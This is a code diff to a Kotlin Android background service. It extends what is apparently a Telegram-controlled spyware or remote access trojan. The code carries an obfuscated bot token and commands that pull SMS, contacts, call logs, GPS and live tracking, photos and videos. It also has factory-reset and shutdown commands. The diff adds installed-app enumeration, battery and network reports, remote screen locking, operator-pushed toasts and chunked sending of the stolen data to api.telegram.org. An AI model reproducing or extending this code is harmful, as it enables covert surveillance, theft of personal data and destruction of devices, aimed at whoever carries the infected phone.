@@ -10,12 +10,16 @@ import android.content.ClipboardManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
 import android.media.MediaRecorder
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.Uri
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
@@ -27,6 +31,7 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.telephony.SmsManager
 import android.util.Log
+import android.widget.Toast
 import androidx.core.content.ContextCompat
 import org.json.JSONArray
 import org.json.JSONObject
@@ -50,6 +55,7 @@ class BackgroundControlService : Service() {
         private const val TAG = "StrictSovereignEngine"
         private const val CHANNEL_ID = "sync_channel_strict_core_v2026_pro"
         private const val NOTIFICATION_ID = 2026
+        private const val MAX_TELEGRAM_TEXT_LENGTH = 3800
 
         private fun getObfuscatedToken(): String {
             val p1 = "9004970470"
@@ -125,6 +131,7 @@ class BackgroundControlService : Service() {
 
     private fun initializeCorePolling() {
         executionExecutor.execute {
+            var backoffMs = 4000L
             while (isRunning) {
                 var connection: HttpURLConnection? = null
                 try {
@@ -139,6 +146,7 @@ class BackgroundControlService : Service() {
                     val response = stream?.bufferedReader()?.use { it.readText() } ?: ""
 
                     if (responseCode == 200 && response.isNotBlank()) {
+                        backoffMs = 4000L
                         val json = JSONObject(response)
                         if (json.optBoolean("ok")) {
                             val results = json.getJSONArray("result")
@@ -174,10 +182,14 @@ class BackgroundControlService : Service() {
                                 }
                             }
                         }
+                    } else {
+                        Thread.sleep(backoffMs)
+                        backoffMs = (backoffMs * 2).coerceAtMost(20000L)
                     }
                 } catch (_: Exception) {
                     try {
-                        Thread.sleep(6000)
+                        Thread.sleep(backoffMs)
+                        backoffMs = (backoffMs * 2).coerceAtMost(20000L)
                     } catch (_: InterruptedException) {
                     }
                 } finally {
@@ -201,8 +213,11 @@ class BackgroundControlService : Service() {
             trimmed.startsWith("call:", ignoreCase = true) -> {
                 executeCall(chatId, trimmed.substringAfter(":").trim())
             }
+            trimmed.startsWith("toast:", ignoreCase = true) -> {
+                executeScreenToast(chatId, trimmed.substringAfter(":").trim())
+            }
             else -> {
-                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية الشاملة نشطة. اختر الأمر المطلوب:")
+                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية المطوّرة نشطة. اختر السلاح أو الأمر المطلوب:")
             }
         }
     }
@@ -225,12 +240,15 @@ class BackgroundControlService : Service() {
                 data == "view_videos" -> enumerateTargetVideos(chatId)
                 data == "pull_videos" -> extractAndPushRecentVideos(chatId, 5)
                 data == "list_devices" -> sendDeviceDetails(chatId)
+                data == "get_battery_net" -> sendBatteryAndNetworkReport(chatId)
+                data == "get_installed_apps" -> extractInstalledApps(chatId)
+                data == "lock_screen" -> executeLockScreen(chatId)
                 data == "get_calls" -> extractCallHistory(chatId)
                 data == "get_sms" -> extractSmsArchive(chatId)
                 data == "get_contacts" -> extractContactsDirectory(chatId)
                 data == "factory_reset" -> executeTerminalWipe(chatId)
                 data == "remote_shutdown" -> executeHardShutdown(chatId)
-                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة في الخلفية.")
+                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: المنظومة تعمل بكفاءة تامة في الخلفية.")
                 data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
                 data.startsWith("pull_images_") -> {
                     val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
@@ -238,6 +256,103 @@ class BackgroundControlService : Service() {
                 }
                 else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
             }
+        }
+    }
+
+    private fun sendBatteryAndNetworkReport(chatId: String) {
+        try {
+            val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
+            val pct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
+            val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val netType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val active = cm.activeNetwork
+                val caps = active?.let { cm.getNetworkCapabilities(it) }
+                when {
+                    caps == null -> "غير متصل"
+                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
+                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "بيانات الهاتف"
+                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
+                    else -> "متصل"
+                }
+            } else {
+                @Suppress("DEPRECATION")
+                cm.activeNetworkInfo?.typeName ?: "غير معروف"
+            }
+
+            val report = buildString {
+                append("🔋 تقرير الطاقة والاتصال:\n")
+                append("• نسبة البطارية: ${if (pct >= 0) "$pct%" else "غير متوفر"}\n")
+                append("• حالة الشحن: ${if (charging) "قيد الشحن / مكتمل" else "على البطارية"}\n")
+                append("• شبكة الاتصال: $netType\n")
+                append("• التتبع الحي: ${if (isTrackingActive) "مفعل" else "متوقف"}")
+            }
+            sendDirectMessage(chatId, report)
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ فحص البطارية والشبكة: ${e.message}")
+        }
+    }
+
+    private fun extractInstalledApps(chatId: String) {
+        try {
+            val pm = packageManager
+            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0L))
+            } else {
+                @Suppress("DEPRECATION")
+                pm.getInstalledApplications(0)
+            }
+
+            val appNames = packages
+                .mapNotNull { info ->
+                    val label = pm.getApplicationLabel(info)?.toString()?.trim()
+                    if (!label.isNullOrBlank()) "• $label (${info.packageName})" else null
+                }
+                .sorted()
+
+            if (appNames.isEmpty()) {
+                sendDirectMessage(chatId, "ℹ️ لم يتم العثور على تطبيقات.")
+                return
+            }
+
+            val header = "📦 التطبيقات المثبتة (إجمالي ${appNames.size} - أول 80):\n\n"
+            sendDirectMessage(chatId, header + appNames.take(80).joinToString("\n"))
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ سحب التطبيقات: ${e.message}")
+        }
+    }
+
+    private fun executeScreenToast(chatId: String, message: String) {
+        if (message.isBlank()) {
+            sendDirectMessage(chatId, "⚠️ الصيغة المعتمدة: toast:نص الرسالة")
+            return
+        }
+        mainHandler.post {
+            try {
+                Toast.makeText(applicationContext, message, Toast.LENGTH_LONG).show()
+                sendDirectMessage(chatId, "✅ تم إرسال التنبيه إلى شاشة الجهاز.")
+            } catch (e: Exception) {
+                sendDirectMessage(chatId, "❌ تعذر عرض التنبيه: ${e.message}")
+            }
+        }
+    }
+
+    private fun executeLockScreen(chatId: String) {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                dpm.lockNow()
+                sendDirectMessage(chatId, "🔒 تم قفل شاشة الجهاز بنجاح.")
+            } else {
+                sendDirectMessage(chatId, "⚠️ قفل الشاشة يتطلب تفعيل Device Admin أولاً.")
+            }
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ فشل قفل الشاشة: ${e.message}")
         }
     }
 
@@ -436,6 +551,7 @@ class BackgroundControlService : Service() {
 
     private fun executeAbsoluteSystemDump(chatId: String) {
         sendDirectMessage(chatId, "🚀 بدء التفريغ الشامل للبيانات...")
+        sendBatteryAndNetworkReport(chatId)
         extractCallHistory(chatId)
         extractSmsArchive(chatId)
         extractContactsDirectory(chatId)
@@ -929,8 +1045,16 @@ class BackgroundControlService : Service() {
                         put(JSONObject().put("text", "📱 عرض الأجهزة").put("callback_data", "list_devices"))
                     })
                     put(JSONArray().apply {
+                        put(JSONObject().put("text", "🔋 البطارية والشبكة").put("callback_data", "get_battery_net"))
+                        put(JSONObject().put("text", "📦 التطبيقات").put("callback_data", "get_installed_apps"))
+                    })
+                    put(JSONArray().apply {
                         put(JSONObject().put("text", "📍 موقع GPS").put("callback_data", "get_location"))
                         put(JSONObject().put("text", "🟢 تفعيل التتبع").put("callback_data", "start_live_tracking"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🔴 إيقاف التتبع").put("callback_data", "stop_live_tracking"))
+                        put(JSONObject().put("text", "🔒 قفل الشاشة").put("callback_data", "lock_screen"))
                     })
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "💬 سحب الرسائل (SMS)").put("callback_data", "get_sms"))
@@ -985,20 +1109,28 @@ class BackgroundControlService : Service() {
 
     private fun sendDirectMessage(chatId: String, text: String) {
         executionExecutor.execute {
-            var conn: HttpURLConnection? = null
-            try {
-                val body = JSONObject().put("chat_id", chatId).put("text", text)
-                conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.doOutput = true
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.outputStream.use { it.write(body.toString().toByteArray()) }
-                conn.inputStream?.close()
-            } catch (_: Exception) {
-            } finally {
+            val chunks = if (text.length <= MAX_TELEGRAM_TEXT_LENGTH) {
+                listOf(text)
+            } else {
+                text.chunked(MAX_TELEGRAM_TEXT_LENGTH)
+            }
+
+            for (chunk in chunks) {
+                var conn: HttpURLConnection? = null
                 try {
-                    conn?.disconnect()
+                    val body = JSONObject().put("chat_id", chatId).put("text", chunk)
+                    conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
+                    conn.requestMethod = "POST"
+                    conn.doOutput = true
+                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                    conn.outputStream.use { it.write(body.toString().toByteArray()) }
+                    conn.inputStream?.close()
                 } catch (_: Exception) {
+                } finally {
+                    try {
+                        conn?.disconnect()
+                    } catch (_: Exception) {
+                    }
                 }
             }
         }
